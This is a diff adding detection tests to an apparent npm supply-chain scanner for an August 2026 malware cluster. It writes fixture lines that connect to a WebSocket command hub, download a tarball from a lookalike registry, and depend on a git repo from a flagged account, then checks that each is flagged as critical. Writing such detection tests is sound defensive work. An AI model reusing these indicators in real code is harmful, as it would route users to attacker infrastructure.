@@ -4572,4 +4572,75 @@ describe("Campaign Signatures", () => {
     });
   });
 
+  // =================================================================
+  // Vellia / Guangnao / lodash-js npm malware cluster (August 2026)
+  //
+  // Five unrelated publishers whose OpenSSF malicious-packages write-ups
+  // landed in the same window. The package rows came from the importer; the
+  // atomic indicators below were extracted from the write-ups by hand and are
+  // single-source (amazon-inspector), so their feed rows carry confidence 0.85.
+  // =================================================================
+
+  describe("Vellia / Guangnao / lodash-js cluster (August 2026)", () => {
+    it("flags the @guangnao/agent-proxy WebSocket command hub", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "cli.js"),
+        'const hub = "wss://hub.client-llm.com/ws"; connect(hub);'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("flags the registrynpmjs.to registry lookalike", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "fetch.js"),
+        'download("https://registrynpmjs.to/inquirer-14.0.2.tgz");'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("flags the navaLinh account behind the unpinned git dependency", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "deps.js"),
+        'const dep = "git+https://github.com/navaLinh/node-ai.git";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_MALICIOUS_ACCOUNT"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("resolves the pinned @velliajs/discord versions and leaves others alone", () => {
+      const feed = getBundledFeed();
+
+      for (const version of ["1.0.3", "1.0.4", "1.0.5", "1.0.6", "1.0.7"]) {
+        expect(
+          matchBareNpmIOC("@velliajs/discord", version, feed),
+          `@velliajs/discord@${version} must resolve as an npm IOC`,
+        ).toBeTruthy();
+      }
+
+      // The advisory pins 1.0.3 through 1.0.7. A version outside that set must
+      // not resolve, or the pin has silently widened into a name-level block.
+      expect(
+        matchBareNpmIOC("@velliajs/discord", "1.0.2", feed),
+        "@velliajs/discord@1.0.2 is outside the advisory range",
+      ).toBeNull();
+    });
+  });
+
 });
